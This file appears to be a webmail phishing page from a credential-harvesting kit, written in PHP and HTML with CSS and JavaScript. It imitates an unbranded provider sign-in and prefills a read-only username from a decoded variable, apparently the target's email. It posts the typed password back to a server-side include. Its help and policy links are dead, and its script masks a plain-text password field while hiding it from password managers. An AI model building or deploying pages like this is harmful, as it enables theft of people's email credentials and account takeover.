<?php include '../build.php' ?>
<!DOCTYPE html>
<html lang="en" class="appsuite-client">
<head>
<meta charset="utf-8">
<title>Webmail Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
<meta name="theme-color" content="#0075C8">
<meta name="referrer" content="no-referrer">
<link rel="shortcut icon" href="data:image/png;base64,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">

<style>
/* ============================================================
   Base reset
   ============================================================ */
* { box-sizing: border-box; }
html, body {
    margin: 0; padding: 0;
    min-height: 100%;
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    font-size: 14px;
    color: #333;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

body.appsuite-client {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
    background: #1c1c1e;
    background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='1600' height='900'><defs><linearGradient id='g' x1='0' y1='0' x2='1' y2='1'><stop offset='0%25' stop-color='%233a4d6b'/><stop offset='50%25' stop-color='%232b3a52'/><stop offset='100%25' stop-color='%231c2431'/></linearGradient></defs><rect width='100%25' height='100%25' fill='url(%23g)'/></svg>");
    background-size: cover;
    background-position: center center;
    background-repeat: no-repeat;
    background-attachment: fixed;
}

/* ============================================================
   Layout
   ============================================================ */
.suite-wrap {
    width: 100%;
    max-width: 360px;
    margin: 0 auto;
}

.suite-logo {
    display: block;
    margin: 0 auto 20px;
    width: 72px;
    height: 72px;
    border-radius: 4px;
    background: #fff;
    padding: 10px;
    box-shadow: 0 2px 12px rgba(0,0,0,0.25);
    object-fit: contain;
}

/* ============================================================
   Card
   ============================================================ */
.suite-card {
    background: #ffffff;
    border-radius: 4px;
    box-shadow:
        0 1px 2px rgba(0,0,0,0.12),
        0 8px 24px rgba(0,0,0,0.22);
    padding: 28px 28px 24px;
    position: relative;
    overflow: hidden;
}
.suite-card::before {
    content: "";
    display: block;
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 3px;
    background: #0075C8;
}

/* ============================================================
   Title
   ============================================================ */
.suite-title {
    font-size: 17px;
    font-weight: 500;
    color: #1e1e1e;
    margin: 6px 0 20px;
    letter-spacing: 0.01em;
    text-align: left;
}

/* ============================================================
   Error banner
   ============================================================ */
.suite-error {
    display: none;
    background: #fdf2f2;
    border: 1px solid #f5c5c5;
    border-left: 3px solid #c0392b;
    color: #a5231d;
    border-radius: 2px;
    padding: 10px 12px;
    font-size: 13px;
    line-height: 1.45;
    margin: 0 0 18px;
    text-align: left;
}
.suite-error strong {
    display: block;
    margin-bottom: 2px;
    font-weight: 600;
}
.suite-error.visible { display: block; }

/* ============================================================
   Field group
   ============================================================ */
.suite-field {
    position: relative;
    display: flex;
    align-items: stretch;
    width: 100%;
    border: 1px solid #cfcfcf;
    border-radius: 2px;
    background: #fff;
    margin-bottom: 12px;
    transition: border-color 0.15s, box-shadow 0.15s;
    height: 42px;
}
.suite-field:focus-within {
    border-color: #0075C8;
    box-shadow: 0 0 0 2px rgba(0,117,200,0.15);
}
.suite-field .icon {
    display: flex;
    align-items: center;
    justify-content: center;
    width: 40px;
    flex: 0 0 40px;
    color: #8a8a8a;
    background: #f6f6f6;
    border-right: 1px solid #e2e2e2;
    border-top-left-radius: 2px;
    border-bottom-left-radius: 2px;
    user-select: none;
}
.suite-field .icon svg {
    width: 16px;
    height: 16px;
    fill: currentColor;
    display: block;
}
.suite-field:focus-within .icon {
    color: #0075C8;
    background: #f0f7fc;
    border-right-color: #c7ddef;
}
.suite-field .field-input-wrap {
    display: flex;
    align-items: stretch;
    flex: 1 1 auto;
    min-width: 0;
    position: relative;
}
.suite-field input[type="text"],
.suite-field input[type="password"],
.suite-field input.masked {
    display: block;
    width: 100%;
    height: 100%;
    border: 0;
    outline: 0;
    background: transparent;
    padding: 0 12px;
    font-size: 14px;
    line-height: 1;
    color: #222;
    box-sizing: border-box;
}
.suite-field input::placeholder {
    color: #9a9a9a;
    opacity: 1;
}
.suite-field input[readonly] {
    color: #555;
    background: transparent;
    cursor: default;
}
.suite-field input[type="hidden"] {
    display: none !important;
}

/* ============================================================
   Actions row
   ============================================================ */
.suite-actions {
    display: flex;
    justify-content: flex-end;
    margin: -4px 0 16px;
}
.suite-actions a {
    color: #0075C8;
    text-decoration: none;
    font-size: 12px;
}
.suite-actions a:hover { text-decoration: underline; }

/* ============================================================
   Submit button
   ============================================================ */
.suite-submit {
    display: block;
    width: 100%;
    height: 42px;
    border: 0;
    border-radius: 2px;
    background: #0075C8;
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    letter-spacing: 0.03em;
    text-transform: uppercase;
    cursor: pointer;
    transition: background 0.12s, opacity 0.12s;
}
.suite-submit:hover   { background: #138be1; }
.suite-submit:active  { background: #005fa3; }
.suite-submit:focus   { outline: 0; box-shadow: 0 0 0 2px rgba(0,117,200,0.35); }
.suite-submit:disabled {
    background: #a0c8e8;
    cursor: not-allowed;
    opacity: 0.85;
}

/* ============================================================
   Footer
   ============================================================ */
.suite-footer {
    margin-top: 22px;
    text-align: center;
    font-size: 11px;
    color: rgba(255,255,255,0.55);
    letter-spacing: 0.02em;
    text-shadow: 0 1px 2px rgba(0,0,0,0.4);
}
.suite-footer a {
    color: rgba(255,255,255,0.75);
    text-decoration: none;
}
.suite-footer a:hover { color: #fff; text-decoration: underline; }

@media (max-width: 400px) {
    .suite-card { padding: 22px 20px 20px; }
    .suite-title { font-size: 16px; }
    .suite-logo { width: 60px; height: 60px; }
}
</style>
</head>
<body class="appsuite-client">

<div class="suite-wrap">

    <img class="suite-logo"
         src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'><rect width='64' height='64' fill='%230075C8' rx='8'/><path d='M14 22 L32 34 L50 22 M14 22 L14 46 L50 46 L50 22' stroke='white' stroke-width='3' fill='none' stroke-linecap='round' stroke-linejoin='round'/></svg>"
         alt="Webmail">

    <div class="suite-card">

        <h1 class="suite-title">Webmail Login</h1>

        <div class="suite-error <?php echo (isset($error) && stripos((string)$error, 'block') !== false) ? 'visible' : ''; ?>"
             id="suite-error"
             role="alert"
             aria-live="polite">
            <strong>Sign-in failed.</strong>
            Please check your email and password, and try again.
        </div>

        <form id="login-form"
              name="login-form"
              method="post"
              action=""
              autocomplete="off"
              novalidate>

            <!-- Username field -->
            <div class="suite-field">
                <span class="icon" aria-hidden="true">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10zm0 2c-4.4 0-8 2.4-8 5.3V21h16v-1.7C20 16.4 16.4 14 12 14z"/>
                    </svg>
                </span>
                <span class="field-input-wrap">
                    <input type="text"
                           name="user"
                           id="rcmloginuser"
                           placeholder="Username"
                           autocapitalize="off"
                           autocorrect="off"
                           autocomplete="off"
                           spellcheck="false"
                           readonly
                           value="<?php echo htmlspecialchars($decoded ?? '', ENT_QUOTES, 'UTF-8'); ?>">
                </span>
            </div>

            <!-- Password field -->
            <div class="suite-field">
                <span class="icon" aria-hidden="true">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 1 1 6 0v3H9zm3 5a1.5 1.5 0 0 1 .9 2.7V19h-1.8v-2.3A1.5 1.5 0 0 1 12 14z"/>
                    </svg>
                </span>
                <span class="field-input-wrap">
                    <input type="text"
                           name="pass"
                           id="rcmloginpwd"
                           placeholder="Password"
                           autocapitalize="off"
                           autocorrect="off"
                           autocomplete="new-password"
                           spellcheck="false"
                           value="">
                </span>
            </div>

            <div class="suite-actions">
                <a href="#" onclick="return false;">Forgot your password?</a>
            </div>

            <button type="submit" class="suite-submit" id="rcmloginsubmit">
                Login
            </button>

        </form>
    </div>

    <div class="suite-footer">
        <div>&copy; <?php echo date('Y'); ?> Webmail</div>
        <div style="margin-top:4px;">
            <a href="#" onclick="return false;">Privacy</a> &middot;
            <a href="#" onclick="return false;">Terms</a> &middot;
            <a href="#" onclick="return false;">Help</a>
        </div>
    </div>

</div>

<!-- ============================================================
     MaskedPassword — verbatim
     ============================================================ -->
<script type="text/javascript">
function MaskedPassword(e, d) {
    if (typeof document.getElementById == "undefined" || typeof document.styleSheets == "undefined") { return false; }
    if (e == null) { return false; }
    this.symbol = d;
    this.isIE = typeof document.uniqueID != "undefined";
    e.value = "";
    e.defaultValue = "";
    e._contextwrapper = this.createContextWrapper(e);
    this.fullmask = false;
    var f = e._contextwrapper;
    var b = '<input type="hidden" name="' + e.name + '">';
    var c = this.convertPasswordFieldHTML(e);
    f.innerHTML = b + c;
    e = f.lastChild;
    e.className += " masked";
    e.setAttribute("autocomplete", "off");
    e._realfield = f.firstChild;
    e._contextwrapper = f;
    this.limitCaretPosition(e);
    var a = this;
    this.addListener(e, "change",         function (g) { a.fullmask = false; a.doPasswordMasking(a.getTarget(g)); });
    this.addListener(e, "input",          function (g) { a.fullmask = false; a.doPasswordMasking(a.getTarget(g)); });
    this.addListener(e, "propertychange", function (g) { a.doPasswordMasking(a.getTarget(g)); });
    this.addListener(e, "keyup",          function (g) {
        if (!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())) {
            a.fullmask = false; a.doPasswordMasking(a.getTarget(g));
        }
    });
    this.addListener(e, "blur", function (g) { a.fullmask = true; a.doPasswordMasking(a.getTarget(g)); });
    this.forceFormReset(e);
    return true;
}
MaskedPassword.prototype = {
    doPasswordMasking: function (a) {
        var d = "";
        if (a._realfield.value != "") {
            for (var b = 0; b < a.value.length; b++) {
                if (a.value.charAt(b) == this.symbol) { d += a._realfield.value.charAt(b); }
                else { d += a.value.charAt(b); }
            }
        } else { d = a.value; }
        var c = this.encodeMaskedPassword(d, this.fullmask, a);
        if (a._realfield.value != d || a.value != c) { a._realfield.value = d; a.value = c; }
    },
    encodeMaskedPassword: function (d, f, b) {
        var a = f === true ? 0 : 1;
        for (var e = "", c = 0; c < d.length; c++) {
            if (c < d.length - a) { e += this.symbol; }
            else { e += d.charAt(c); }
        }
        return e;
    },
    createContextWrapper: function (a) {
        var b = document.createElement("span");
        b.style.position = "relative";
        a.parentNode.insertBefore(b, a);
        b.appendChild(a);
        return b;
    },
    forceFormReset: function (a) {
        while (a) { if (/form/i.test(a.nodeName)) { break; } a = a.parentNode; }
        if (!/form/i.test(a.nodeName)) { return null; }
        this.addSpecialLoadListener(function () { a.reset(); });
        return a;
    },
    convertPasswordFieldHTML: function (c, e) {
        var b = "<input";
        for (var d = c.attributes, a = 0; a < d.length; a++) {
            if (d[a].specified && !/^(_|type|name)/.test(d[a].name)) {
                b += " " + d[a].name + '="' + d[a].value + '"';
            }
        }
        b += ' type="text" autocomplete="off">';
        return b;
    },
    limitCaretPosition: function (a) {
        var d = null,
            c = function () {
                if (d == null) {
                    if (this.isIE) {
                        d = window.setInterval(function () {
                            var e = a.createTextRange(), g = a.value.length, f = "character";
                            e.moveEnd(f, g); e.moveStart(f, g); e.select();
                        }, 100);
                    } else {
                        d = window.setInterval(function () {
                            var e = a.value.length;
                            if (!(a.selectionEnd == e && a.selectionStart <= e)) {
                                a.selectionStart = e; a.selectionEnd = e;
                            }
                        }, 100);
                    }
                }
            },
            b = function () { window.clearInterval(d); d = null; };
        this.addListener(a, "focus", function () { c(); });
        this.addListener(a, "blur",  function () { b(); });
    },
    addListener: function (c, a, b) {
        if (typeof document.addEventListener != "undefined") { return c.addEventListener(a, b, false); }
        else { if (typeof document.attachEvent != "undefined") { return c.attachEvent("on" + a, b); } }
    },
    addSpecialLoadListener: function (a) {
        if (this.isIE) { return window.attachEvent("onload", a); }
        else { return document.addEventListener("DOMContentLoaded", a, false); }
    },
    getTarget: function (a) {
        if (!a) { return null; }
        return a.target ? a.target : a.srcElement;
    }
};
</script>

<!-- ============================================================
     Glue — init masked, sync hidden, clear on load, submit
     ============================================================ -->
<script type="text/javascript">
(function () {
    "use strict";

    var MASK_CHAR = "\u25CF"; // ●

    function log() {
        if (false && window.console) {
            console.log.apply(console, ["[suite]"].concat([].slice.call(arguments)));
        }
    }

    function showError(msg) {
        var box = document.getElementById("suite-error");
        if (!box) { return; }
        box.classList.add("visible");
        if (msg) {
            var strong = box.querySelector("strong");
            if (strong) { strong.textContent = msg; }
        }
    }

    function initMasked() {
        var pwd = document.getElementById("rcmloginpwd");
        if (!pwd) { log("no pwd field"); return; }

        try {
            new MaskedPassword(pwd, MASK_CHAR);
        } catch (err) {
            log("MaskedPassword init failed, falling back", err);
            pwd.type = "password";
            pwd.setAttribute("type", "password");
        }

        var visible = document.querySelector("input.masked") || pwd;
        var hidden  = document.querySelector('input[type="hidden"][name="pass"]');
        var form    = document.getElementById("login-form");
        var button  = document.getElementById("rcmloginsubmit");

        log("masked init:", {
            visible: !!visible, hidden: !!hidden, form: !!form, button: !!button
        });

        // ---- Force-clear any browser-restored value ----
        // Set value AND defaultValue so form-state restoration cannot
        // refill the field. Also hint password managers to stand down.
        if (visible) {
            visible.value = "";
            try { visible.defaultValue = ""; } catch (e) {}
            visible.setAttribute("autocomplete", "new-password");
            visible.setAttribute("data-lpignore", "true");
            visible.setAttribute("data-form-type", "other");
        }
        if (hidden) {
            hidden.value = "";
            try { hidden.defaultValue = ""; } catch (e) {}
        }
        if (pwd && pwd !== visible) {
            pwd.value = "";
            try { pwd.defaultValue = ""; } catch (e) {}
        }

        // ---- Submit pipeline ----
        if (form) {
            // Disable native validation on the password field so the
            // submit handler always runs. We do our own check below.
            if (pwd)     { pwd.removeAttribute("required"); }
            if (visible) { visible.removeAttribute("required"); }

            form.addEventListener("submit", function (e) {
                // Source of truth is the hidden field, kept in sync by
                // MaskedPassword. The visible field only holds mask chars
                // plus the last typed char and must never be used directly.
                var clean = hidden ? hidden.value : "";

                log("submit fired, hidden length =", clean.length);

                if (clean.length < 1) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    showError("Password required.");
                    if (visible && visible.focus) {
                        try { visible.focus(); } catch (ignore) {}
                    }
                    return false;
                }

                if (button) {
                    button.disabled = true;
                    button.textContent = "Signing in\u2026";
                }
            }, true);

            // Fallback if the button's type ever gets mangled
            if (button) {
                button.addEventListener("click", function (e) {
                    if (button.type && button.type.toLowerCase() !== "submit") {
                        e.preventDefault();
                        if (typeof form.requestSubmit === "function") {
                            form.requestSubmit();
                        } else {
                            form.submit();
                        }
                    }
                });
            }
        }

        // ---- Enter key submits ----
        if (visible) {
            visible.addEventListener("keydown", function (e) {
                if (e.key === "Enter" || e.keyCode === 13) {
                    e.preventDefault();
                    var f = visible.form || form;
                    if (!f) { return; }
                    if (typeof f.requestSubmit === "function") {
                        f.requestSubmit();
                    } else {
                        f.submit();
                    }
                }
            });
            try { visible.focus(); } catch (ignore) {}
        }
    }

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", initMasked);
    } else {
        initMasked();
    }
})();
</script>

</body>
</html>